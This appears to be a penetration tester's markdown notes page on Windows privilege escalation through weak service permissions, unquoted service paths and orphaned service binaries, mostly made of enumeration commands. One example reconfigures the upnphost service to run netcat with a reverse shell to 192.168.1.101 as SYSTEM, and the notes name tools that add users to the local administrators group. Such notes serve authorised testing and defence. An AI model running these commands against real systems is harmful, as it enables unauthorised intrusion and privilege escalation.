# Services

**References:**  
* [Windows privilege escalation via weak service permissions](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)
* [Trusted Service Paths](https://www.sock-raw.org/wiki/doku.php/windows_priv_esc#trusted_service_paths)

* Always a good idea to find something wrong with services, as these normally run as system.

## Weak Permissions
* If you find a service that has *write permissions* set to everyone you can change that binary into your custom binary and make it execute in the privileged context.
* Note: Windows XP shipped with several vulnerable built-in services.

### Find Weak Services - Command Line  
  Can use either `wmic`, `sc.exe` or `accesschk.exe` (SEE BELOW). What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights.

* Excluded service executables that live in c:\windows\system32 folder because more than likely those folders have the proper permissions because they came packaged with windows.

### Find Weak Services - PowerSploit
* The Get-ServiceDetail module will list some basic information about the service like the process ID and the state.
* The module that will display information equivalent to the query service configuration is the Get-ModifiableService . This module will list all the services that the user can modify the binary path and also will determine if the user can restart the service.
* The module Invoke-ServiceAbuse will automatically modify the binary path and restart the service in order to add the user john into the local administrators group.

See more [here](https://pentestlab.blog/2017/03/30/weak-service-permissions/)

### Known Weak Services

  - Change the **upnp** service binary
  ```
  upnphost
    RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
    RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
    RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS         ****
  ```
  ** This allowed any user logged in could reconfigure these services
  ```
  c:> sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
  c:> sc config upnphost obj= ".\LocalSystem" password= ""
  c:> sc config upnphost depend= ""
  ```

  - Windows XP SP3
  ```
  DcomLaunch
    RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
    RW BUILTIN\Power Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG       **** THIS IS THE IMPORTANT ONE
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        READ_CONTROL
  ```
  ** If you can reconfigure service, you can set it to run arbitrary binary.

  - Windows XP SP1
  ```
  SSDPSRV
    RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
    RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
    RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS         ****
  ```
  ** Has been patched, but might still find

* Permissions that we should look for:

Permission            | Good for us?
---                   | ---
SERVICE_CHANGE_CONFIG | Can reconfigure service binary
WRITE_DAC             | Can reconfigure permissions. leading to SERVICE_CHANGE_CONFIG
WRITE_OWNER           | Can become the owner, reconfigure permissions
GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG
GENERIC_ALL           | Inherits SERVICE_CHANGE_CONFIG


### Unquoted Service Paths / Trusted Service Paths

* Find Services With Unquoted Paths  

```
Using WMIC
c:> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" |findstr /i /v """
c:> wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """


# Using sc
c:> sc query              --> get a list of services
c:> sc qc [service name]  --> check manually, one by one

# Look for BINARY_PATH_NAME and see if it is unquoted.

# Using PowerShell
pws> gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

```
  If the path contains a space and is not quoted, the service is vulnerable.

* If the path to the binary is unquoted:
  ```
  C:\Program Files\Some Folder\Service.exe
  ```

  Windows would try to locate and execute programs in the following order:
  ```
  - C:\Program.exe
  - C:\Program Files\Some.exe
  - C:\Program Files\Some Folder\Service.exe
  ```

* Metasploit Module
  ```
  exploit/windows/local/trusted_service_path
  ```

### Orphaned Installs:
  - Missing files in writable locations.

  - Have a look at Autoruns (in Sysinternals) at services running there. Sometimes there will be a file that is not found for a service that was defined (and forgotten about). If the location of this file is writable, you can replace this and have it run as system.
  ```
  c:>  autoruns.exe -a | findstr /n /R "File\ not\ found"
  ```


## Tools

#### WMIC

See [security/tools/wmic.md](../../tools/wmic.md)

#### Service Control - **sc.exe**  
See [security/tools/sc.exe.md](../../tools/sc.exe.md)

#### AccessChk
* AccessChk (from SysInternals suite) can also be used to find weak services:
  ```
  c:> accesschk.exe -uwcqv *
  c:> accesschk.exe -uwcqv "Authenticated Users" *
  c:> accesschk.exe -uwcqv "Authenticated Users" * /accepteula
  c:> accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
  c:> accesschk.exe -qdws Users C:\Windows\
  c:> accesschk.exe -ucqv SSDPSRV
  c:> accesschk.exe -uwcqv "Username" * -accepteula
  ```
  Then query service using `sc.exe`
  ```
  c:> sc qc Apache
  ```
